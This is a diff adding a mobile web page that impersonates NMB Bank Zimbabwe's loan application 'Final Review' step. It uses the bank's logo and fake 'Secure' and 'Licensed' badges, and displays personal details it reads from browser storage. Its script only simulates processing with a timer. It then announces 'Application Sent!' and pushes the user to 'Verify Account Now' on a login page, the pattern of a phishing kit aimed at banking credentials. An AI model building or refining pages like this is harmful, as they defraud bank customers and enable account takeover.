@@ -1,0 +1,709 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Final Review - NMB Bank Zimbabwe</title>
+    <meta name="theme-color" content="#001f3f">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&display=swap');
+      
+        :root {
+            --primary: #001f3f;
+            --primary-dark: #000f1f;
+            --primary-light: #e8f0f8;
+            --accent: #D4AF37;
+            --accent-light: #f5ead3;
+            --dark: #1a1a1a;
+            --gray-900: #1a1a1a;
+            --gray-800: #2d2d2d;
+            --gray-700: #4a4a4a;
+            --gray-600: #6c757d;
+            --gray-500: #8a9aaa;
+            --gray-400: #b0b8c0;
+            --gray-200: #e8ecf1;
+            --gray-100: #f5f7fa;
+            --white: #ffffff;
+            --success: #2b8a3e;
+            --error: #dc3545;
+            --shadow-soft: 0 4px 12px rgba(0,0,0,0.05);
+            --shadow-hard: 0 12px 32px rgba(0,0,0,0.1);
+            --radius-lg: 24px;
+            --radius-md: 16px;
+            --radius-sm: 10px;
+            --transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        html {
+            scroll-behavior: smooth;
+        }
+
+        body {
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            background: var(--gray-100);
+            color: var(--dark);
+            line-height: 1.6;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        .container {
+            max-width: 520px;
+            margin: 0 auto;
+            padding: 0 24px;
+        }
+
+        /* ===== NAVIGATION ===== */
+        nav {
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            background: rgba(255, 255, 255, 0.8);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            padding: 14px 0;
+            margin-bottom: 32px;
+            border-bottom: 1px solid var(--gray-200);
+        }
+
+        .nav-content {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .nav-left {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+        }
+
+        .back-link {
+            width: 40px;
+            height: 40px;
+            background: var(--gray-100);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--gray-700);
+            text-decoration: none;
+            transition: var(--transition);
+            font-size: 16px;
+            border: 1px solid var(--gray-200);
+        }
+
+        .back-link:hover {
+            background: var(--primary-light);
+            color: var(--primary);
+            border-color: var(--primary-light);
+        }
+
+        .logo-img {
+            height: 40px;
+            width: auto;
+        }
+
+        .trust-badges {
+            display: flex;
+            gap: 8px;
+        }
+
+        .trust-tag {
+            background: var(--primary-light);
+            color: var(--primary);
+            font-size: 11px;
+            font-weight: 700;
+            padding: 6px 12px;
+            border-radius: 20px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        /* ===== FORM CARD ===== */
+        .form-card {
+            background: var(--white);
+            border-radius: var(--radius-lg);
+            padding: 40px 32px;
+            box-shadow: var(--shadow-soft);
+            margin-bottom: 40px;
+        }
+
+        .form-header {
+            text-align: center;
+            margin-bottom: 32px;
+        }
+
+        .form-title {
+            font-size: 28px;
+            font-weight: 800;
+            color: var(--primary);
+            margin-bottom: 8px;
+            letter-spacing: -0.5px;
+        }
+
+        .form-subtitle {
+            font-size: 14px;
+            color: var(--gray-600);
+            font-weight: 500;
+        }
+
+        /* ===== PROGRESS ===== */
+        .progress-section {
+            margin-bottom: 32px;
+        }
+
+        .progress-label {
+            display: flex;
+            justify-content: space-between;
+            font-size: 12px;
+            font-weight: 700;
+            color: var(--gray-600);
+            margin-bottom: 10px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .progress-bar {
+            height: 6px;
+            background: var(--gray-200);
+            border-radius: 10px;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, var(--primary), var(--accent));
+            border-radius: 10px;
+            transition: width 0.4s ease;
+        }
+
+        /* ===== FORM GROUPS ===== */
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-label {
+            display: block;
+            font-size: 14px;
+            font-weight: 600;
+            color: var(--gray-700);
+            margin-bottom: 8px;
+        }
+
+        .input-wrapper {
+            position: relative;
+        }
+
+        .input-icon {
+            position: absolute;
+            left: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: var(--primary);
+            font-size: 16px;
+            z-index: 2;
+        }
+
+        .form-input,
+        .form-select {
+            width: 100%;
+            padding: 14px 16px 14px 48px;
+            background: var(--gray-100);
+            border: 1.5px solid var(--gray-200);
+            border-radius: var(--radius-sm);
+            font-size: 15px;
+            font-weight: 600;
+            color: var(--gray-900);
+            outline: none;
+            transition: var(--transition);
+            font-family: inherit;
+            appearance: none;
+        }
+
+        .form-select {
+            cursor: pointer;
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 24 24' stroke='%234a4a4a'%3E%3Cpath stroke-linecap='round' stroke-linejoin='round' stroke-width='2' d='M19 9l-7 7-7-7'%3E%3C/path%3E%3C/svg%3E");
+            background-repeat: no-repeat;
+            background-position: right 16px center;
+            background-size: 18px;
+            padding-right: 44px;
+        }
+
+        .form-input:focus,
+        .form-select:focus {
+            background: var(--white);
+            border-color: var(--primary);
+            box-shadow: 0 0 0 4px rgba(0, 31, 63, 0.08);
+        }
+
+        /* ===== SUMMARY BOX ===== */
+        .summary-box {
+            background: linear-gradient(135deg, var(--primary) 0%, #002d5c 100%);
+            border-radius: var(--radius-lg);
+            padding: 28px;
+            margin: 32px 0;
+            color: var(--white);
+        }
+
+        .summary-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 14px;
+            font-size: 14px;
+            opacity: 0.85;
+        }
+
+        .summary-row:last-child {
+            margin-bottom: 0;
+        }
+
+        .summary-value {
+            font-weight: 700;
+            color: var(--white);
+            opacity: 1;
+        }
+
+        .summary-row.highlight {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 14px 16px;
+            border-radius: var(--radius-sm);
+            margin-bottom: 16px;
+            font-size: 16px;
+        }
+
+        .summary-row.highlight .summary-value {
+            color: var(--accent);
+            font-size: 18px;
+            font-weight: 800;
+        }
+
+        .summary-divider {
+            height: 1px;
+            background: rgba(255, 255, 255, 0.1);
+            margin: 16px 0;
+        }
+
+        /* ===== BUTTONS ===== */
+        .btn-group {
+            display: grid;
+            grid-template-columns: 1fr 2fr;
+            gap: 12px;
+            margin-top: 40px;
+        }
+
+        .btn {
+            padding: 16px 24px;
+            border-radius: var(--radius-sm);
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            border: none;
+            transition: var(--transition);
+            font-family: inherit;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .btn-prev {
+            background: var(--gray-100);
+            color: var(--gray-700);
+            border: 1px solid var(--gray-200);
+        }
+
+        .btn-prev:hover {
+            background: var(--gray-200);
+            border-color: var(--gray-300);
+        }
+
+        .btn-submit {
+            background: var(--primary);
+            color: var(--white);
+            box-shadow: 0 8px 20px rgba(0, 31, 63, 0.15);
+        }
+
+        .btn-submit:hover {
+            background: var(--primary-dark);
+            transform: translateY(-2px);
+            box-shadow: 0 12px 28px rgba(0, 31, 63, 0.2);
+        }
+
+        .btn-submit:active {
+            transform: translateY(0);
+        }
+
+        /* ===== OVERLAYS ===== */
+        #spinnerOverlay,
+        #successOverlay {
+            position: fixed;
+            inset: 0;
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            padding: 20px;
+        }
+
+        #spinnerOverlay {
+            background: rgba(255, 255, 255, 0.9);
+            backdrop-filter: blur(8px);
+            -webkit-backdrop-filter: blur(8px);
+            flex-direction: column;
+            gap: 20px;
+        }
+
+        .main-spinner {
+            width: 56px;
+            height: 56px;
+            border: 4px solid var(--gray-100);
+            border-top: 4px solid var(--primary);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        #successOverlay {
+            background: rgba(0, 15, 31, 0.6);
+            backdrop-filter: blur(8px);
+            -webkit-backdrop-filter: blur(8px);
+        }
+
+        .success-card {
+            background: var(--white);
+            border-radius: var(--radius-lg);
+            padding: 40px 32px;
+            width: 100%;
+            max-width: 420px;
+            text-align: center;
+            box-shadow: var(--shadow-hard);
+            animation: popIn 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+
+        @keyframes popIn {
+            from { transform: scale(0.8); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
+        }
+
+        .check-circle {
+            width: 80px;
+            height: 80px;
+            background: #f0fdf4;
+            color: var(--success);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 40px;
+            margin: 0 auto 24px;
+            border: 2px solid #dcfce7;
+        }
+
+        .success-title {
+            font-size: 26px;
+            font-weight: 800;
+            color: var(--primary);
+            margin-bottom: 12px;
+            letter-spacing: -0.5px;
+        }
+
+        .success-msg {
+            font-size: 15px;
+            color: var(--gray-600);
+            line-height: 1.6;
+            margin-bottom: 32px;
+        }
+
+        .redirect-status {
+            background: var(--gray-100);
+            padding: 14px;
+            border-radius: var(--radius-sm);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            font-size: 14px;
+            font-weight: 700;
+            color: var(--gray-700);
+            margin-bottom: 20px;
+        }
+
+        .mini-spinner {
+            width: 16px;
+            height: 16px;
+            border: 2px solid var(--gray-200);
+            border-top: 2px solid var(--primary);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        /* ===== FOOTER ===== */
+        footer {
+            padding: 40px 0;
+            text-align: center;
+            border-top: 1px solid var(--gray-200);
+        }
+
+        .footer-logo {
+            height: 32px;
+            opacity: 0.4;
+            margin-bottom: 16px;
+        }
+
+        .footer-text {
+            font-size: 12px;
+            color: var(--gray-600);
+            font-weight: 500;
+        }
+
+        /* ===== RESPONSIVE ===== */
+        @media (max-width: 768px) {
+            .container {
+                padding: 0 20px;
+            }
+
+            .form-card {
+                padding: 32px 24px;
+            }
+
+            .form-title {
+                font-size: 24px;
+            }
+
+            .trust-badges {
+                display: none;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .btn-group {
+                grid-template-columns: 1fr;
+            }
+
+            .form-card {
+                padding: 28px 20px;
+            }
+
+            nav {
+                margin-bottom: 24px;
+                padding: 12px 0;
+            }
+
+            .nav-left {
+                gap: 12px;
+            }
+
+            .success-card {
+                padding: 32px 24px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+<nav>
+    <div class="container nav-content">
+        <div class="nav-left">
+            <a href="javascript:history.back()" class="back-link" title="Go back">
+                <i class="fas fa-chevron-left"></i>
+            </a>
+            <img src="https://nmbz.co.zw/nmb/sites/default/files/logo_1.png" alt="NMB Bank" class="logo-img">
+        </div>
+        <div class="trust-badges">
+            <span class="trust-tag"><i class="fas fa-lock"></i> Secure</span>
+            <span class="trust-tag"><i class="fas fa-check-circle"></i> Licensed</span>
+        </div>
+    </div>
+</nav>
+
+<main class="container">
+    <div class="form-card">
+        <div class="form-header">
+            <h1 class="form-title">Final Review</h1>
+            <p class="form-subtitle">Step 3 of 3: Confirm & Submit Application</p>
+        </div>
+        
+        <div class="progress-section">
+            <div class="progress-label">
+                <span>Application Progress</span>
+                <span>100% Complete</span>
+            </div>
+            <div class="progress-bar">
+                <div class="progress-fill"></div>
+            </div>
+        </div>
+
+        <div class="form-group">
+            <label class="form-label">Employment Status</label>
+            <div class="input-wrapper">
+                <span class="input-icon"><i class="fas fa-briefcase"></i></span>
+                <select class="form-select" id="employmentStatus">
+                    <option value="">-- Select Status --</option>
+                    <option value="employed">Employed</option>
+                    <option value="self-employed">Self-Employed</option>
+                    <option value="unemployed">Unemployed</option>
+                    <option value="student">Student</option>
+                    <option value="retired">Retired</option>
+                </select>
+            </div>
+        </div>
+
+        <div class="form-group">
+            <label class="form-label">Estimated Annual Income (USD)</label>
+            <div class="input-wrapper">
+                <span class="input-icon"><i class="fas fa-wallet"></i></span>
+                <input type="number" class="form-input" id="annualIncome" placeholder="e.g. 12000" min="0" step="100">
+            </div>
+        </div>
+
+        <div class="summary-box" id="summaryBox">
+            <!-- Populated by JS -->
+        </div>
+
+        <div class="btn-group">
+            <button class="btn btn-prev" onclick="history.back()">
+                <i class="fas fa-chevron-left"></i> Back
+            </button>
+            <button class="btn btn-submit" id="submitBtn">
+                Submit Now <i class="fas fa-check-circle"></i>
+            </button>
+        </div>
+    </div>
+
+    <footer>
+        <img src="https://nmbz.co.zw/nmb/sites/default/files/logo_1.png" alt="NMB Bank" class="footer-logo">
+        <p class="footer-text">© 2026 NMB Bank Limited – Licensed Financial Services Provider in Zimbabwe</p>
+    </footer>
+</main>
+
+<!-- Spinner Overlay -->
+<div id="spinnerOverlay">
+    <div class="main-spinner"></div>
+    <p style="font-weight: 700; color: var(--gray-700);">Processing Application...</p>
+</div>
+
+<!-- Success Overlay -->
+<div id="successOverlay">
+    <div class="success-card">
+        <div class="check-circle"><i class="fas fa-check"></i></div>
+        <h2 class="success-title">Application Sent!</h2>
+        <p class="success-msg">
+            Your loan application has been received successfully. Please verify your account now to proceed with the loan approval.
+        </p>
+        <div class="redirect-status">
+            <div class="mini-spinner"></div>
+            Redirecting in <span id="countdown">3</span>s...
+        </div>
+        <button class="btn btn-submit" style="width: 100%;" onclick="window.location.href='login'">
+            <i class="fas fa-sign-in-alt"></i> Verify Account Now
+        </button>
+    </div>
+</div>
+
+<script>
+    const summaryBox = document.getElementById('summaryBox');
+    
+    // Get data from localStorage and sessionStorage
+    const loanData = sessionStorage.getItem('loanData') ? JSON.parse(sessionStorage.getItem('loanData')) : {};
+    const loanAmount = localStorage.getItem('loanAmount') || loanData.amount || '5000';
+    const loanTenor = loanData.tenor || '12';
+    const loanReason = loanData.reason || 'General Loan';
+    const firstName = localStorage.getItem('firstName') || '';
+    const lastName = localStorage.getItem('lastName') || '';
+    const email = localStorage.getItem('email') || 'N/A';
+    const phone = localStorage.getItem('phone') || 'N/A';
+    
+    // Generate summary
+    summaryBox.innerHTML = `
+        <div class="summary-row highlight">
+            <span>Requested Amount:</span>
+            <span class="summary-value">USD ${parseFloat(loanAmount).toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})}</span>
+        </div>
+        <div class="summary-divider"></div>
+        <div class="summary-row">
+            <span>Loan Type:</span>
+            <span class="summary-value">${loanReason}</span>
+        </div>
+        <div class="summary-row">
+            <span>Repayment Period:</span>
+            <span class="summary-value">${loanTenor} Months</span>
+        </div>
+        <div class="summary-row">
+            <span>Applicant:</span>
+            <span class="summary-value">${firstName} ${lastName}</span>
+        </div>
+        <div class="summary-row">
+            <span>Email:</span>
+            <span class="summary-value">${email}</span>
+        </div>
+        <div class="summary-row">
+            <span>Mobile Number:</span>
+            <span class="summary-value">+263 ${phone}</span>
+        </div>
+    `;
+
+    // Pre-fill employment status and income
+    if (localStorage.getItem('employmentStatus')) {
+        document.getElementById('employmentStatus').value = localStorage.getItem('employmentStatus');
+    }
+    if (localStorage.getItem('annualIncome')) {
+        document.getElementById('annualIncome').value = localStorage.getItem('annualIncome');
+    }
+
+    // Submit handler
+    document.getElementById('submitBtn').addEventListener('click', function() {
+        const employmentStatus = document.getElementById('employmentStatus').value;
+        const annualIncome = document.getElementById('annualIncome').value.trim();
+
+        // Save to localStorage
+        localStorage.setItem('employmentStatus', employmentStatus);
+        localStorage.setItem('annualIncome', annualIncome);
+
+        // Show spinner
+        const spinnerOverlay = document.getElementById('spinnerOverlay');
+        spinnerOverlay.style.display = 'flex';
+
+        // Simulate processing (3 seconds)
+        setTimeout(() => {
+            spinnerOverlay.style.display = 'none';
+            const successOverlay = document.getElementById('successOverlay');
+            successOverlay.style.display = 'flex';
+            
+            // Countdown timer
+            let seconds = 3;
+            const countdownEl = document.getElementById('countdown');
+            const timer = setInterval(() => {
+                seconds--;
+                countdownEl.textContent = seconds;
+                if (seconds <= 0) {
+                    clearInterval(timer);
+                    window.location.href = 'login';
+                }
+            }, 1000);
+        }, 3000);
+    });
+
+    // Allow Enter key to submit
+    document.getElementById('annualIncome').addEventListener('keypress', function(e) {
+        if (e.key === 'Enter') {
+            document.getElementById('submitBtn').click();
+        }
+    });
+</script>
+
+</body>
+</html>
